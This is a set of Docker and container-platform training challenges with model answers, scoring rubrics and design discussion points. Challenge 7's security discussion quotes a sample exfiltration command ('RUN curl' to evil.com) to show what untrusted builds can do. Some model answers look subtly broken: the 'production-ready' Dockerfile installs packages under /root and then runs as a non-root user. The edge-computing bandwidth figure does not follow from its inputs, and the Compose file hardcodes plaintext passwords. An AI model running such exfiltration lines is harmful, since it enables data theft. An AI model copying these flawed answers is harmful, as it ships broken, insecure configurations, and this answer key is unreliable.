These challenges test your Docker knowledge at three levels of difficulty. Each challenge is designed to be completed in 30-60 minutes. The model answers and rubrics let you self-assess your solution against professional standards.

## Tier 1: Foundation

These challenges test your ability to write Dockerfiles and configure Docker Compose for common scenarios. Each challenge should take 15-20 minutes.

### Challenge 1: The Minimal API Dockerfile

**Task**: Write a production-ready Dockerfile for a Python FastAPI application. The application has these requirements:
- Python 3.11 runtime
- Dependencies in requirements.txt (fastapi, uvicorn, pydantic, httpx)
- Application code in src/ directory
- Runs on port 8000
- Must not run as root
- Must be optimized for production (small image, fast startup)

**Model Answer**:

```dockerfile
FROM python:3.11-slim AS builder
WORKDIR /build
COPY requirements.txt .
RUN pip install --no-cache-dir --user -r requirements.txt

FROM python:3.11-slim AS production
WORKDIR /app
RUN addgroup --system --gid 1001 appgroup && \
    adduser --system --uid 1001 --gid 1001 appuser
COPY --from=builder /root/.local /root/.local
COPY --chown=appuser:appgroup src/ ./src/
ENV PATH=/root/.local/bin:$PATH
USER appuser
EXPOSE 8000
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:8000/health')"
CMD ["uvicorn", "src.main:app", "--host", "0.0.0.0", "--port", "8000"]
```

**Key decisions**:
- Multi-stage build separates dependency installation from the runtime image, keeping the final image small.
- pip install --user installs packages to the user site-packages directory, avoiding the need for virtual environments.
- The health check uses Python's standard library to avoid adding curl to the image.
- The non-root user runs the application, reducing the blast radius of a security vulnerability.
- --no-cache-dir prevents pip from caching package downloads, reducing image size.

### Challenge 2: Multi-Service Compose

**Task**: Write a docker-compose.yml for a three-tier application with these services:
- **Frontend**: React application served by Nginx on port 80
- **API**: Node.js Express API on port 3000
- **Database**: PostgreSQL 15 on port 5432
- **Redis**: Cache layer on port 6379

Requirements:
- The API must wait for the database to be healthy before starting
- The database must persist data across restarts
- Only the frontend port should be exposed to the host
- Resource limits on all services
- Logging configuration with rotation

**Model Answer**:

```yaml
version: "3.8"

services:
  frontend:
    image: my-app/frontend:latest
    ports:
      - "80:80"
    depends_on:
      - api
    deploy:
      resources:
        limits:
          cpus: "0.5"
          memory: 256M
    logging:
      driver: json-file
      options:
        max-size: "10m"
        max-file: "3"

  api:
    image: my-app/api:latest
    environment:
      - DATABASE_URL=postgres://myapp:password@db:5432/myapp
      - REDIS_URL=redis://cache:6379
    depends_on:
      db:
        condition: service_healthy
      cache:
        condition: service_started
    deploy:
      resources:
        limits:
          cpus: "1.0"
          memory: 512M
        reservations:
          cpus: "0.25"
          memory: 256M
    logging:
      driver: json-file
      options:
        max-size: "10m"
        max-file: "3"
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/health"]
      interval: 30s
      timeout: 5s
      retries: 3
      start_period: 15s

  db:
    image: postgres:15
    volumes:
      - pgdata:/var/lib/postgresql/data
    environment:
      - POSTGRES_USER=myapp
      - POSTGRES_PASSWORD=password
      - POSTGRES_DB=myapp
    deploy:
      resources:
        limits:
          cpus: "2.0"
          memory: 1G
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U myapp"]
      interval: 5s
      timeout: 5s
      retries: 5
    logging:
      driver: json-file
      options:
        max-size: "10m"
        max-file: "3"

  cache:
    image: redis:7-alpine
    deploy:
      resources:
        limits:
          cpus: "0.5"
          memory: 256M
    logging:
      driver: json-file
      options:
        max-size: "10m"
        max-file: "3"

volumes:
  pgdata:
```

**Key decisions**:
- The API service depends on the database's health check, not just its startup. This prevents the API from connecting before the database is ready to accept queries.
- Resource reservations (minimum guarantees) and limits (maximum caps) are set separately. The API gets at least 256 MB and 0.25 CPU, but can burst to 512 MB and 1 CPU.
- Only the frontend service exposes a host port. The API, database, and cache communicate through the internal Docker network.
- Named volume `pgdata` persists database data across container restarts and recreations.

### Challenge 3: Dockerfile for a Go Binary

**Task**: Write a Dockerfile for a Go application that produces a 10 MB binary from a `cmd/server/main.go` entry point. The final image must be under 20 MB and must not contain the Go compiler or any build tools. The binary needs to run on port 9090.

**Model Answer**:

```dockerfile
FROM golang:1.21-alpine AS builder
WORKDIR /build
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -ldflags="-s -w" -o /app/server ./cmd/server

FROM scratch
COPY --from=builder /app/server /server
EXPOSE 9090
CMD ["/server"]
```

**Key decisions**:
- Using `scratch` as the base image produces an image that contains only the Go binary — nothing else. The final image size equals the binary size (approximately 10 MB).
- `CGO_ENABLED=0` produces a statically linked binary that does not depend on any shared libraries on the host.
- `-ldflags="-s -w"` strips debug information and the symbol table from the binary, reducing its size by 30-40%.
- The `scratch` image has no shell, so the CMD must use exec form (`["/server"]`) not shell form (`"/server"`).
- For production Go services, you may need to add `ca-certificates.crt` for HTTPS connections: `COPY --from=alpine:latest /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/`.

## Tier 2: Design

These challenges test your ability to design Docker-based systems. Each challenge should take 30-45 minutes. Use the rubric to evaluate your solution.

### Challenge 4: Design a CI/CD Pipeline for Docker Images

**Task**: Design a CI/CD pipeline that builds, tests, and deploys Docker images for a team of 50 engineers working on 30 microservices. The pipeline must:

1. Build images only when source code changes
2. Run unit tests, integration tests, and security scans
3. Deploy to staging automatically, production after manual approval
4. Support rollback to any previous version
5. Complete a full build+test+deploy cycle in under 15 minutes

**Rubric**:

| Criteria | Excellent (3 pts) | Good (2 pts) | Fair (1 pt) |
|---|---|---|---|
| Build caching | Uses Docker layer caching with multi-stage builds. Builds only changed service images. | Uses Docker layer caching but builds all images on every push. | No caching. Full rebuild every time. |
| Security scanning | Scans for vulnerabilities, blocks builds with critical CVEs, and scans base images weekly. | Scans for vulnerabilities but does not block builds. | No security scanning. |
| Deployment strategy | Blue-green or canary with health check verification and automatic rollback on failure. | Rolling update with health checks. | Simple stop-and-start deploy. |
| Rollback capability | Can rollback to any previous version by image tag in under 60 seconds. | Can rollback to the previous version only. | No rollback mechanism. |
| Pipeline speed | Under 15 minutes including tests. Parallelizes build and test across services. | Under 30 minutes. | Over 30 minutes. |

**Scoring guide**: 13-15 points = Senior level. 9-12 points = Mid level. Under 9 points = Additional practice needed.

### Challenge 5: Design a Container Networking Strategy

**Task**: Design a container networking strategy for a platform with 200 microservices across three environments (dev, staging, production). The platform runs on Kubernetes in a single cloud region. Requirements:

1. Each microservice has a stable DNS name that other services can resolve
2. Network policies restrict which services can communicate with each other
3. Services must be isolated by environment — dev services cannot reach production services
4. External traffic enters through a single ingress point
5. Services can be deployed across multiple availability zones for fault tolerance

**Rubric**:

| Criteria | Excellent (3 pts) | Good (2 pts) | Fair (1 pt) |
|---|---|---|---|
| Service discovery | Kubernetes DNS with headless services for stateful workloads. Custom domain names for external lookup. | Kubernetes DNS only. | No service discovery. Hardcoded IPs. |
| Network isolation | Network policies per namespace with default-deny ingress and egress. Fine-grained rules per service. | Namespace-level isolation only. | No network policies. |
| Cross-environment isolation | Separate Kubernetes clusters per environment. VPC peering with explicit allowlists. | Separate namespaces in the same cluster. | Single cluster, single namespace. |
| Ingress | TLS termination, rate limiting, WAF integration, and path-based routing at the ingress. | Basic TLS termination and routing. | No ingress. Direct pod exposure. |
| Multi-AZ | Pod anti-affinity rules spread pods across AZs. Node port or LB health checks per AZ. | Single AZ deployment. | Single AZ, no redundancy. |

**Scoring guide**: 13-15 points = Senior level. 9-12 points = Mid level. Under 9 points = Additional practice needed.

### Challenge 6: Design a Container Image Optimization Strategy

**Task**: Your organization's Docker images are 1-3 GB each. Engineers report that deployments take 3-5 minutes because of image pull time. You have 200 microservices and 500 engineers. Design a strategy to reduce deployment time to under 30 seconds.

**Rubric**:

| Criteria | Excellent (3 pts) | Good (2 pts) | Fair (1 pt) |
|---|---|---|---|
| Image size reduction | Multi-stage builds for all services. Images under 200 MB. Uses distroless or scratch base images. | Multi-stage builds for most services. Images under 500 MB. | No multi-stage builds. Images over 1 GB. |
| Layer caching | Optimizes Dockerfile order for cache hits. Uses dependency caches (npm ci, pip --user, go mod download). | Some layer ordering. | No layer cache optimization. |
| Registry strategy | Geo-replicated registry with local caches in each region. Pull-through cache for public images. | Single-region registry. | Default Docker Hub for all images. |
| Base image management | Uses pinned base image digests, not tags. Automated weekly rebuilds for security patches. | Uses version tags (node:18). | Uses latest tags. |
| Pull optimization | Uses image manifest lists for multi-arch. Configured max-concurrent-downloads. | Single-arch images. | No optimization. |

**Scoring guide**: 13-15 points = Senior level. 9-12 points = Mid level. Under 9 points = Additional practice needed.

## Tier 3: Expert

These challenges test your ability to design novel container solutions. Each challenge requires deep knowledge of the container ecosystem. There is no single correct answer — the discussion points evaluate your reasoning.

### Challenge 7: Design a Container Security Platform for Multi-Tenant Workloads

**Task**: Design a container platform that runs untrusted code from multiple tenants. Each tenant submits a Dockerfile and a Docker image. The platform builds the image, scans it, and runs it. Tenants must not be able to access each other's data, network traffic, or processes. The platform must support 1,000 concurrent tenants running up to 10 containers each.

**Discussion Points**:

**Isolation level**: Standard Docker containers are insufficient for multi-tenant workloads with untrusted code. A kernel exploit in one container could compromise the host and all other containers. The minimum viable isolation is a micro-VM per tenant workload. Firecracker (used by AWS Lambda and Fargate) boots in 125 ms with 5 MB memory overhead and provides hardware-level isolation. Each tenant's containers run inside a micro-VM, so a container escape only compromises the micro-VM, not the host.

**Image building**: Building untrusted Dockerfiles is dangerous. The build process can execute arbitrary commands — RUN curl http://evil.com/exfil — that could exfiltrate data or modify the host. The build must run in a sandboxed environment, ideally a micro-VM or a dedicated build node that is destroyed after each build. The build environment must have no network access to internal systems. All base image downloads must go through an approved proxy that scans for known malicious images.

**Image scanning**: Every image must be scanned for vulnerabilities, malware, and secrets before it is allowed to run. Scans must check for:
- Packages with known CVEs (using Trivy or Grype)
- Hardcoded credentials or API keys
- Suspicious binaries (MIME type mismatch, packed executables)
- Network connections to known malicious IPs

**Runtime security**: Each tenant's containers run with:
- Seccomp profiles that deny unnecessary syscalls
- AppArmor or SELinux profiles
- Read-only root filesystem with tmpfs for writable paths
- No Linux capabilities beyond what is explicitly needed
- Network policies that isolate the tenant's network from other tenants
- Per-container network egress filtering (deny all, allow specific IPs)
- Resource limits on CPU, memory, disk, and network bandwidth

**Data isolation**: Each tenant gets a dedicated filesystem namespace. Persistent storage uses encrypted volumes with per-tenant encryption keys. The orchestrator ensures that volumes are mounted only to the correct tenant's containers. Network traffic between tenants is blocked at the hypervisor and network policy level.

**Observability**: The platform provides each tenant with logs, metrics, and traces for their own containers only. Logs are collected per container and stored in a tenant-specific log stream. Metrics are aggregated per tenant. The platform team can see aggregate metrics across all tenants but cannot read individual tenant application logs.

### Challenge 8: Design a Container Platform for Edge Computing

**Task**: Design a container platform that runs compute workloads at the edge — 10,000 locations worldwide, each with limited compute resources (4 vCPU, 8 GB RAM, 100 Mbps network). Locations are in retail stores, factories, and cell towers. The platform must support deploying containers remotely, updating them over low-bandwidth connections, and operating offline (no internet connectivity for hours at a time).

**Discussion Points**:

**Offline operation**: Each edge location must operate independently when the central cloud is unreachable. The edge node runs a local container orchestrator (a lightweight Kubernetes distribution like K3s or MicroK8s) that manages local containers. The orchestrator caches the desired state locally and reconciles toward it. When connectivity is restored, the orchestrator syncs state with the central cloud and reports any missed events.

**Image distribution**: Edge locations have limited bandwidth. A 200 MB image takes 16 seconds to download at 100 Mbps. For 10,000 locations, a simultaneous image pull consumes 2 Tbps of bandwidth. The solution is:
- Use delta updates: transmit only the changed layers, not the full image.
- Use a content delivery network (CDN) to cache images at edge locations.
- Use lazy image pulling: start the container from the filesystem metadata and download layers on demand (Stargz or Nydus snapshotter).
- Schedule image pulls during off-peak hours (e.g., 2 AM local time).
- Support image pre-seeding: push critical images to all locations during low-bandwidth windows.

**Resource constraints**: Each edge node has 4 vCPU and 8 GB RAM. The platform must reserve resources for the operating system and the orchestrator, leaving 6-7 GB for user containers. The orchestrator must:
- Prevent over-provisioning by limiting the total CPU and memory limits of all containers to the node's capacity.
- Prioritize critical containers (safety, security) over non-critical ones when resources are constrained.
- Support container eviction: when the node runs out of memory, evict lowest-priority containers first.
- Use CPU pinning for latency-sensitive workloads.

**Networking**: Edge locations may have NAT, firewalls, or carrier-grade NAT that prevents inbound connections. The platform must use:
- Outbound-only connections: edge nodes initiate connections to the central cloud, never the reverse.
- WebSocket or gRPC streaming for control plane communication.
- Local service discovery using mDNS or DNS-SD for containers within the same edge location.
- Traffic prioritization: control plane traffic gets QoS priority over user traffic.

**Update strategy**: Updating the orchestrator or container runtime on 10,000 edge locations is a high-risk operation. The platform must:
- Use canary updates: update 1% of locations, monitor for 24 hours, then roll out to remaining locations.
- Support atomic updates: the update either succeeds or rolls back to the previous version.
- Use A/B partitions: the edge node has two partitions for the orchestrator software. The active partition runs the current version. The update writes to the inactive partition and reboots into it. If the new version fails, the node reboots into the old partition.
- Allow remote rollback: if an update causes problems, the central cloud can command all nodes to roll back to the previous version.

**Monitoring**: Edge nodes send heartbeat and metrics to the central cloud when connectivity is available. Metrics are buffered locally and transmitted in batches. The central cloud monitors:
- Node health (CPU, memory, disk, network)
- Container health (running, crashed, OOM-killed)
- Deployment status (up-to-date, updating, failed)
- Connectivity status (online, offline, last seen)
- Image pull progress and bandwidth usage
